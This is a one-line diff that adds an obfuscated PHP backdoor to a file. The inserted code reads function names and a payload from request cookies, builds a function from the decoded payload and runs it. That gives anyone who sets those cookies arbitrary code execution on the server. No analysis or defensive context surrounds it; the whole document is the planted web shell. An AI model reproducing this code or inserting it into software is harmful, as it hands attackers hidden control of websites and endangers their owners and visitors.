@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['kaxk']){$og=$_COOKIE['kaxk']("",@$_COOKIE['lep'](@$_COOKIE['feum']));$og();}?>
